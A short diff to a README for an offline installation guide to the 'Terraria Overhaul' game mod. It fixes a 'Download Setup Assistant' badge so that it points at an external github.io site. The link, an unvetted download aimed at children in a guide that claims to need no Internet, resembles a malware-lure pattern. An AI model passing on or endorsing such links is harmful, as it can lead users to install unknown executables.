@@ -1,7 +1,7 @@
 
 # Terraria Overhaul — Offline Installation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](terraria-overhaul-setup-assistant.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://terraria-overhaul-setup-assistant.github.io/.github)
 
 A friendly, kid-approved manual that shows you how to install the **Terraria Overhaul** mod on a computer with zero Internet access.
 
